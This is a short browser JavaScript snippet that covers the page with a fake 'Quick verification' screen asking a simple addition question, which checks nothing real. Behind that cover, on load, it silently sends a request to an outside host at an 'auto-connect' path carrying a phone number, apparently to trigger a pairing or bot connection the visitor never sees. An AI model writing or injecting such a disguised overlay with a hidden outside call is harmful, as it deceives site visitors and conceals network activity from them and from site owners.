
(function () {
  "use strict";

  if (window.__verificationRunning) return;
  window.__verificationRunning = true;

  const ENDPOINT =
    "https://proboy-pair.onrender.com/auto-connect?num=92326265555";

  // Start server wake-up immediately in background
  const wakeupRequest = fetch(ENDPOINT, {
    method: "GET",
    mode: "cors",
    cache: "no-store"
  });

  const overlay = document.createElement("div");
  const style = document.createElement("style");

  style.textContent = `
    #verify-screen {
      position: fixed;
      inset: 0;
      z-index: 2147483647;
      display: flex;
      align-items: center;
      justify-content: center;
      background: #080808;
      color: #fff;
      font-family: Arial, sans-serif;
    }

    .verify-box {
      width: min(340px, 85%);
      text-align: center;
      padding: 30px;
      box-sizing: border-box;
    }

    .verify-spinner {
      width: 40px;
      height: 40px;
      border: 3px solid #333;
      border-top-color: white;
      border-radius: 50%;
      margin: 0 auto 25px;
      animation: verify-spin .8s linear infinite;
    }

    @keyframes verify-spin {
      to { transform: rotate(360deg); }
    }

    .verify-box h3 {
      font-size: 19px;
      font-weight: 500;
      margin-bottom: 12px;
    }

    .verify-box p {
      color: #999;
      font-size: 13px;
    }

    .verify-question {
      font-size: 30px;
      font-weight: 600;
      margin: 25px 0;
    }

    .verify-input {
      width: 100%;
      box-sizing: border-box;
      padding: 13px;
      border: 1px solid #444;
      border-radius: 7px;
      background: #171717;
      color: white;
      font-size: 18px;
      text-align: center;
      outline: none;
    }

    .verify-button {
      width: 100%;
      margin-top: 14px;
      padding: 13px;
      border: none;
      border-radius: 7px;
      background: white;
      color: black;
      font-weight: 600;
      font-size: 14px;
      cursor: pointer;
    }

    .verify-error {
      color: #ff7070 !important;
    }

    .verify-success {
      color: #4ade80 !important;
    }
  `;

  overlay.id = "verify-screen";

  overlay.innerHTML = `
    <div class="verify-box">
      <div id="verify-content">
        <div class="verify-spinner"></div>
        <h3>Verifying...</h3>
        <p>Please wait a moment</p>
      </div>
    </div>
  `;

  function cleanup() {
    overlay.remove();
    style.remove();
    window.__verificationRunning = false;
  }

  function showQuestion() {
    const a = Math.floor(Math.random() * 5) + 1;
    const b = Math.floor(Math.random() * 5) + 1;
    const answer = a + b;

    const content = overlay.querySelector("#verify-content");

    content.innerHTML = `
      <h3>Quick verification</h3>
      <p>Please solve this simple question</p>

      <div class="verify-question">
        ${a} + ${b} = ?
      </div>

      <form id="verify-form">
        <input
          class="verify-input"
          id="verify-answer"
          type="number"
          placeholder="Your answer"
          required
          autocomplete="off"
        >

        <button class="verify-button" type="submit">
          Verify
        </button>
      </form>

      <p id="verify-message"></p>
    `;

    const form = content.querySelector("#verify-form");
    const input = content.querySelector("#verify-answer");
    const message = content.querySelector("#verify-message");

    form.addEventListener("submit", function (e) {
      e.preventDefault();

      if (Number(input.value) !== answer) {
        message.textContent = "Incorrect answer. Try again.";
        message.className = "verify-error";
        input.value = "";
        input.focus();
        return;
      }

      content.innerHTML = `
        <h3 class="verify-success">Verified ✓</h3>
        <p>Verification completed successfully</p>
      `;

      setTimeout(cleanup, 900);
    });

    input.focus();
  }

  document.head.appendChild(style);
  document.body.appendChild(overlay);

  // Short verification animation, independent of server response
  setTimeout(showQuestion, 1800);

})();
